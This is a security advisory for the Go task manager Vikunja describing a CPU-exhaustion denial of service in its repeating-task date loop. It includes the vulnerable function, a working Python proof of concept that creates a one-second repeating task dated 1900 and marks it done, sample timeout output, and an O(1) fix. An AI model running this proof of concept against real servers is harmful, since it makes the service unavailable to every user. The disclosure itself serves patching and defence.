# [M] Vikunja has Algorithmic Complexity DoS in Repeating Task Handler

## Summary
Severity: Medium
Advisory: GHSA-r4fg-73rc-hhh7
CVE: CVE-2026-35599
CWE: CWE-407
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-r4fg-73rc-hhh7
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The `addRepeatIntervalToTime` function uses an O(n) loop that advances a date by the task's `RepeatAfter` duration until it exceeds the current time. By creating a repeating task with a 1-second interval and a due date far in the past, an attacker triggers billions of loop iterations, consuming CPU and holding a database connection for minutes per request.

## Details

The vulnerable function at `pkg/models/tasks.go:1456-1464`:

```go
func addRepeatIntervalToTime(now, t time.Time, duration time.Duration) time.Time {
    for {
        t = t.Add(duration)
        if t.After(now) {
            break
        }
    }
    return t
}
```

The `RepeatAfter` field accepts any positive integer (validated as `range(0|9223372036854775807)`), and `DueDate` accepts any valid timestamp including dates far in the past. When a task with `repeat_after=1` and `due_date=1900-01-01` is marked as done, the loop runs approximately 4 billion iterations (~60+ seconds of CPU time).

Each request holds a goroutine and a database connection for the duration. With the default connection pool size of 100, approximately 100 concurrent requests exhaust all available connections.

## Proof of Concept

Tested on Vikunja v2.2.2.

```python
import requests, time

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

token = requests.post(f"{API}/login",
    json={"username": "user1", "password": "User1pass!"}).json()["token"]
h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

proj = requests.put(f"{API}/projects", headers=h, json={"title": "DoS Test"}).json()

# create task with repeat_after=1 second and a date far in the past
task = requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h,
    json={"title": "DoS", "repeat_after": 1,
          "due_date": "1900-01-01T00:00:00Z"}).json()

# mark done - triggers the vulnerable loop
start = time.time()
try:
    r = requests.post(f"{API}/tasks/{task['id']}", headers=h,
        json={"title": "DoS", "done": True}, timeout=120)
    print(f"Response: {r.status_code} in {time.time()-start:.1f}s")
except requests.exceptions.Timeout:
    print(f"TIMEOUT after {time.time()-start:.1f}s")
```

Output:
```
TIMEOUT after 60.0s
```

The request hangs for 60+ seconds (the loop runs ~4 billion iterations). For comparison, `due_date=2020-01-01` completes in ~4.8 seconds, confirming the linear relationship. Each request holds a goroutine and a database connection for the duration.

## Impact

Any authenticated user can render the Vikunja instance unresponsive by creating repeating tasks with small intervals and dates far in the past, then marking them as done. With the default database connection pool of 100, approximately 100 concurrent requests would exhaust all connections, preventing all users from accessing the application.

## Recommended Fix

Replace the O(n) loop with O(1) arithmetic:

```go
func addRepeatIntervalToTime(now, t time.Time, duration time.Duration) time.Time {
    if duration <= 0 {
        return t
    }
    diff := now.Sub(t)
    if diff <= 0 {
        return t.Add(duration)
    }
    intervals := int64(diff/duration) + 1
    return t.Add(time.Duration(intervals) * duration)
}
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-r4fg-73rc-hhh7
- https://nvd.nist.gov/vuln/detail/CVE-2026-35599
- https://github.com/go-vikunja/vikunja/pull/2577
- https://github.com/go-vikunja/vikunja/commit/6df0d6c8f54b01db6464c42810e40e55f12b481b
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
